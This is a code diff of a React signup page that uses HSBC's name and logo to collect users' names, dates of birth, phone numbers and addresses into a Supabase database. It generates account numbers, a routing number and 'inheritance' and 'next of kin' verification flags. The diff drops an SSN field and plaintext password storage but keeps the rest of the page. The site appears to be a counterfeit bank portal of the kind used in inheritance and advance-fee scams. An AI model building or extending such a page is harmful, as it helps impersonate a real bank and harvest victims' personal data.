@@ -20,24 +20,23 @@ export function SignupPage({ onNavigate }: SignupPageProps) {
     phone: '',
     dob: '',
     address: '',
-    ssn: '',
     accountType: 'Checking'
   });
 
   const accountTypes = [
-  { value: 'Checking', label: 'Checking Account' },
-  { value: 'Savings', label: 'Savings Account' },
-  { value: 'Credit Card', label: 'Credit Card' },
-  { value: 'Inheritance', label: 'Inheritance Management' },
-  { value: 'Loan', label: 'Loan Account' },
-  { value: 'Investment', label: 'Investment Account' },
-  { value: 'Corporate', label: 'Corporate Banking' },
-  { value: 'Crypto', label: 'Crypto Management' }];
-
+    { value: 'Checking', label: 'Checking Account' },
+    { value: 'Savings', label: 'Savings Account' },
+    { value: 'Credit Card', label: 'Credit Card' },
+    { value: 'Inheritance', label: 'Inheritance Management' },
+    { value: 'Loan', label: 'Loan Account' },
+    { value: 'Investment', label: 'Investment Account' },
+    { value: 'Corporate', label: 'Corporate Banking' },
+    { value: 'Crypto', label: 'Crypto Management' }
+  ];
 
   const handleChange = (
-  e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) =>
-  {
+    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
+  ) => {
     setFormData({
       ...formData,
       [e.target.name]: e.target.value
@@ -65,24 +64,22 @@ export function SignupPage({ onNavigate }: SignupPageProps) {
       const routingNumber = '021000021';
 
       const { error: profileError } = await supabase.from('profiles').insert([
-      {
-        user_id: authData.user.id,
-        email: formData.email,
-        full_name: formData.fullName,
-        phone: formData.phone,
-        dob: formData.dob,
-        address: formData.address,
-        ssn: formData.ssn,
-        account_type: formData.accountType,
-        account_number: accountNumber,
-        routing_number: routingNumber,
-        balance: 0,
-        is_verified: false,
-        next_of_kin_verified: false,
-        password: formData.password,
-        notifications: []
-      }]
-      );
+        {
+          user_id: authData.user.id,
+          email: formData.email,
+          full_name: formData.fullName,
+          phone: formData.phone,
+          dob: formData.dob,
+          address: formData.address,
+          account_type: formData.accountType,
+          account_number: accountNumber,
+          routing_number: routingNumber,
+          balance: 0,
+          is_verified: false,
+          next_of_kin_verified: false,
+          notifications: []
+        }
+      ]);
 
       if (profileError) {
         console.error('Profile creation error:', profileError);
@@ -101,41 +98,36 @@ export function SignupPage({ onNavigate }: SignupPageProps) {
   return (
     <div className="min-h-screen pt-24 pb-12 flex items-center justify-center px-4">
       <Card className="w-full max-w-2xl">
-
         <div className="text-center mb-8">
           <img
             src="/HSBCICON.png"
             alt="HSBC"
-            className="h-12 w-auto mx-auto mb-4" />
-          
+            className="h-12 w-auto mx-auto mb-4"
+          />
 
           <h2 className="text-3xl font-serif font-bold text-white">
             Create your account
           </h2>
 
-          <p className="text-gray-400 mt-2">
-            Join HSBC today
-          </p>
+          <p className="text-gray-400 mt-2">Join HSBC today</p>
         </div>
 
-        {error &&
-        <div className="bg-red-500/10 border border-red-500/20 text-red-500 p-4 rounded-lg mb-6 text-sm">
+        {error && (
+          <div className="bg-red-500/10 border border-red-500/20 text-red-500 p-4 rounded-lg mb-6 text-sm">
             {error}
           </div>
-        }
+        )}
 
         <form onSubmit={handleSubmit} className="space-y-6">
-
           <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-
             <Input
               label="Full Name"
               name="fullName"
               placeholder="John Doe"
               required
               value={formData.fullName}
-              onChange={handleChange} />
-            
+              onChange={handleChange}
+            />
 
             <Input
               label="Email Address"
@@ -144,8 +136,8 @@ export function SignupPage({ onNavigate }: SignupPageProps) {
               placeholder="john@example.com"
               required
               value={formData.email}
-              onChange={handleChange} />
-            
+              onChange={handleChange}
+            />
 
             <Input
               label="Phone Number"
@@ -154,8 +146,8 @@ export function SignupPage({ onNavigate }: SignupPageProps) {
               placeholder="+1 (555) 000-0000"
               required
               value={formData.phone}
-              onChange={handleChange} />
-            
+              onChange={handleChange}
+            />
 
             <Input
               label="Date of Birth"
@@ -163,8 +155,8 @@ export function SignupPage({ onNavigate }: SignupPageProps) {
               type="date"
               required
               value={formData.dob}
-              onChange={handleChange} />
-            
+              onChange={handleChange}
+            />
 
             <Input
               label="Password"
@@ -174,18 +166,8 @@ export function SignupPage({ onNavigate }: SignupPageProps) {
               required
               minLength={6}
               value={formData.password}
-              onChange={handleChange} />
-            
-
-            <Input
-              label="SSN"
-              name="ssn"
-              placeholder="XXX-XX-XXXX"
-              required
-              value={formData.ssn}
-              onChange={handleChange} />
-            
-
+              onChange={handleChange}
+            />
           </div>
 
           <Input
@@ -194,23 +176,23 @@ export function SignupPage({ onNavigate }: SignupPageProps) {
             placeholder="123 Wall St, New York, NY 10005"
             required
             value={formData.address}
-            onChange={handleChange} />
-          
+            onChange={handleChange}
+          />
 
           <Select
             label="Account Type"
             name="accountType"
             options={accountTypes}
             value={formData.accountType}
-            onChange={handleChange} />
-          
+            onChange={handleChange}
+          />
 
           <Button
             type="submit"
             className="w-full"
             size="lg"
-            isLoading={isLoading}>
-            
+            isLoading={isLoading}
+          >
             Create Account
           </Button>
 
@@ -219,15 +201,13 @@ export function SignupPage({ onNavigate }: SignupPageProps) {
             <button
               type="button"
               onClick={() => onNavigate('login')}
-              className="text-brand-orange hover:text-brand-red transition-colors font-medium">
-              
+              className="text-brand-orange hover:text-brand-red transition-colors font-medium"
+            >
               Log in
             </button>
           </p>
-
         </form>
-
       </Card>
-    </div>);
-
+    </div>
+  );
 }
